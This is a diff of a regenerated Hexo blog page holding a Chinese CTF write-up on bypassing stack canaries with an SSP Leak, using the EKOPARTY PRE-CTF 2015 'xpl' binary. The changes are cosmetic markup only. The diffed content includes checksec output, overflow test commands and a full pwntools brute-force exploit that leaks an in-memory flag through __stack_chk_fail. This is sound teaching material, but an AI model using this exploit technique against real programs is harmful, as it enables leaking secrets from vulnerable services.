@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8" />
 
-<meta name="generator" content="Hexo 3.9.0" />
+<meta name="generator" content="Hexo 4.0.0" />
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
@@ -14,16 +14,14 @@
 <meta name="keywords" content="CTF,pwn,StackOverflow,Canary">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Bypassing Canary——SSP Leak">
-<meta property="og:url" content="https://jontsang.github.io/post/36591.html">
+<meta property="og:url" content="https:&#x2F;&#x2F;jontsang.github.io&#x2F;post&#x2F;36591.html">
 <meta property="og:site_name" content="Jon Tsang&#39;Blog">
 <meta property="og:description" content="SSP Leak即Stack Smashing Protect Leak ，从字面意思理解，主要作用是泄漏信息，而非getshell。不过有些题目中flag已经被读取存在内存中了，这时我们就可以通过SSP Leak将flag泄漏出来。 该方法需要我们触发Stack Smashing Protect，即覆盖掉Canary，进入函数__stack_chk_fail中后，将进一步调用__fortify_">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://jontsang.github.io/images/og_image.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;jontsang.github.io&#x2F;images&#x2F;og_image.png">
 <meta property="og:updated_time" content="2019-08-28T01:39:25.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Bypassing Canary——SSP Leak">
-<meta name="twitter:description" content="SSP Leak即Stack Smashing Protect Leak ，从字面意思理解，主要作用是泄漏信息，而非getshell。不过有些题目中flag已经被读取存在内存中了，这时我们就可以通过SSP Leak将flag泄漏出来。 该方法需要我们触发Stack Smashing Protect，即覆盖掉Canary，进入函数__stack_chk_fail中后，将进一步调用__fortify_">
-<meta name="twitter:image" content="https://jontsang.github.io/images/og_image.png">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;jontsang.github.io&#x2F;images&#x2F;og_image.png">
 
 
 
@@ -135,12 +133,12 @@
                     
                 
                 
-                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;" target="_blank" rel="noopener">
                     <i class="fas fa-list-ul"></i>
                 </a>
                 
                 
-                <a class="navbar-item search" title="搜索" href="javascript:;">
+                <a class="navbar-item search" title="搜索" href="javascript:;" target="_blank" rel="noopener">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -205,7 +203,7 @@
 </li>
 </ul>
 <p>OK，现在来看看如何应用SSP Leak~</p>
-<h3 id="EKOPARTY-PRE-CTF-2015-xpl"><a href="#EKOPARTY-PRE-CTF-2015-xpl" class="headerlink" title="EKOPARTY PRE-CTF 2015 xpl"></a>EKOPARTY PRE-CTF 2015 xpl</h3><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span> checksec xpl</span><br><span class="line">[*] '/root/xpl'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<h3 id="EKOPARTY-PRE-CTF-2015-xpl"><a href="#EKOPARTY-PRE-CTF-2015-xpl" class="headerlink" title="EKOPARTY PRE-CTF 2015 xpl"></a>EKOPARTY PRE-CTF 2015 xpl</h3><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> checksec xpl</span></span><br><span class="line">[*] '/root/xpl'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 
 <p>下面IDA的反编译有些问题，<code>flag</code>显然应该是上面<code>printf</code>的参数，不过对分析的影响不大，查看汇编指令就可以发现问题。</p>
 <p>在反编译代码中，可以很明显的看到<code>read(0LL, &amp;v6, 1024LL);</code>存在栈溢出，<code>v6</code>的栈空间大小只有0x90-0x8=0x88。</p>
@@ -213,10 +211,10 @@
 
 <p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190827154944.png" alt></p>
 <p>测试一下是否和分析的一样：</p>
-<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span> python -c 'print "A"*0x88' | ./xpl</span><br><span class="line">Interesting data loaded at 0x7ffd31994cf0</span><br><span class="line">Your username? *** stack smashing detected ***: ./xpl terminated</span><br><span class="line">[1]    3697 done                 python -c 'print "A"*0x88' |</span><br><span class="line">       3698 abort (core dumped)  ./xpl</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> python -c <span class="hljs-string">'print "A"*0x88'</span> | ./xpl</span></span><br><span class="line">Interesting data loaded at 0x7ffd31994cf0</span><br><span class="line">Your username? *** stack smashing detected ***: ./xpl terminated</span><br><span class="line">[1]    3697 done                 python -c 'print "A"*0x88' |</span><br><span class="line">       3698 abort (core dumped)  ./xpl</span><br></pre></td></tr></table></figure>
 
 <p>而程序打印出的”Interesting data loaded at 0x7ffd31994cf0“和明显暗示我们要使用SSP Leak的方法，至少我个人觉得如此。。所以我们继续测试看到大的输入能覆盖掉<code>__libc_argv[0]</code></p>
-<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span> python -c 'print "A"*0x150' | ./xpl</span><br><span class="line">Interesting data loaded at 0x7ffd5b30aad0</span><br><span class="line">Your username? *** stack smashing detected ***: ./xpl terminated</span><br><span class="line">[1]    3712 done                 python -c 'print "A"*0x150' |</span><br><span class="line">       3713 abort (core dumped)  ./xpl</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">$</span> python -c 'print "A"*0x200' | ./xpl</span><br><span class="line">Interesting data loaded at 0x7ffe8138bbd0</span><br><span class="line">Your username? [1]    3727 done                              python -c 'print "A"*0x200' |</span><br><span class="line">       3728 segmentation fault (core dumped)  ./xpl</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">$</span> python -c 'print "A"*0x175' | ./xpl</span><br><span class="line">Interesting data loaded at 0x7ffe6110ddf0</span><br><span class="line">Your username? *** stack smashing detected ***: ./xpl terminated</span><br><span class="line">[1]    3742 done                 python -c 'print "A"*0x175' |</span><br><span class="line">       3743 abort (core dumped)  ./xpl</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> python -c <span class="hljs-string">'print "A"*0x150'</span> | ./xpl</span></span><br><span class="line">Interesting data loaded at 0x7ffd5b30aad0</span><br><span class="line">Your username? *** stack smashing detected ***: ./xpl terminated</span><br><span class="line">[1]    3712 done                 python -c 'print "A"*0x150' |</span><br><span class="line">       3713 abort (core dumped)  ./xpl</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> python -c <span class="hljs-string">'print "A"*0x200'</span> | ./xpl</span></span><br><span class="line">Interesting data loaded at 0x7ffe8138bbd0</span><br><span class="line">Your username? [1]    3727 done                              python -c 'print "A"*0x200' |</span><br><span class="line">       3728 segmentation fault (core dumped)  ./xpl</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> python -c <span class="hljs-string">'print "A"*0x175'</span> | ./xpl</span></span><br><span class="line">Interesting data loaded at 0x7ffe6110ddf0</span><br><span class="line">Your username? *** stack smashing detected ***: ./xpl terminated</span><br><span class="line">[1]    3742 done                 python -c 'print "A"*0x175' |</span><br><span class="line">       3743 abort (core dumped)  ./xpl</span><br></pre></td></tr></table></figure>
 
 <p>OK，现在我们大概确定了一个范围了，一个一个大小试太过麻烦，所以现在可以开始写exp爆破一下。向程序发送的payload应该是<code>&#39;A&#39;*i +flag_addr</code>的形式，完整exp如下：</p>
 <figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.os = <span class="hljs-string">'linux'</span></span><br><span class="line">context.terminal = [<span class="hljs-string">'tmux'</span>, <span class="hljs-string">'splitw'</span>, <span class="hljs-string">'-h'</span>]</span><br><span class="line"><span class="hljs-comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.log_level = <span class="hljs-string">'INFO'</span></span><br><span class="line"></span><br><span class="line">bin_path = <span class="hljs-string">'./xpl'</span></span><br><span class="line">binary = ELF(bin_path)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">(command=<span class="hljs-string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span><span class="hljs-params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x175</span>, <span class="hljs-number">0x200</span>):</span><br><span class="line">        p = process(bin_path)</span><br><span class="line">        recv = p.recvline()</span><br><span class="line">        <span class="hljs-comment"># 取出打印消息中”Interesting data loaded at 0xxxxxxxxxx“的地址</span></span><br><span class="line">        p.sendline(<span class="hljs-string">"A"</span>*i+p64(int(recv.split()[<span class="hljs-number">4</span>],<span class="hljs-number">16</span>)))</span><br><span class="line">        </span><br><span class="line">        log.info(<span class="hljs-string">"Length: "</span> + hex(i))</span><br><span class="line">        log.info(recv)</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            <span class="hljs-keyword">print</span> p.recvline()</span><br><span class="line">        <span class="hljs-keyword">except</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line">        sleep(<span class="hljs-number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    <span class="hljs-keyword">if</span> len(sys.argv) == <span class="hljs-number">1</span>:</span><br><span class="line">        <span class="hljs-keyword">global</span> p</span><br><span class="line">        <span class="hljs-comment">#p = process(executable=bin_path, argv=[bin_path])</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-comment">#p = remote(sys.argv[1], int(sys.argv[2]))</span></span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
@@ -241,7 +239,7 @@
             <div class="level-start">
                 <div class="level-item">
                     <span class="is-size-6 has-text-grey has-mr-7">#</span>
-                    <a class="has-link-grey -link" href="/tags/CTF/">CTF</a>, <a class="has-link-grey -link" href="/tags/Canary/">Canary</a>, <a class="has-link-grey -link" href="/tags/StackOverflow/">StackOverflow</a>, <a class="has-link-grey -link" href="/tags/pwn/">pwn</a>
+                    <a class="has-link-grey -link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="has-link-grey -link" href="/tags/Canary/" rel="tag">Canary</a>, <a class="has-link-grey -link" href="/tags/StackOverflow/" rel="tag">StackOverflow</a>, <a class="has-link-grey -link" href="/tags/pwn/" rel="tag">pwn</a>
                 </div>
             </div>
         </div>
@@ -458,7 +456,7 @@ var IcarusThemeSettings = {
 
 <div id="outdated">
     <h6>Your browser is out-of-date!</h6>
-    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update
             my browser now </a></p>
     <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
 </div>
@@ -502,7 +500,7 @@ document.addEventListener('DOMContentLoaded', function () {
     
     
 
-<a id="back-to-top" title="回到顶端" href="javascript:;">
+<a id="back-to-top" title="回到顶端" href="javascript:;" target="_blank" rel="noopener">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
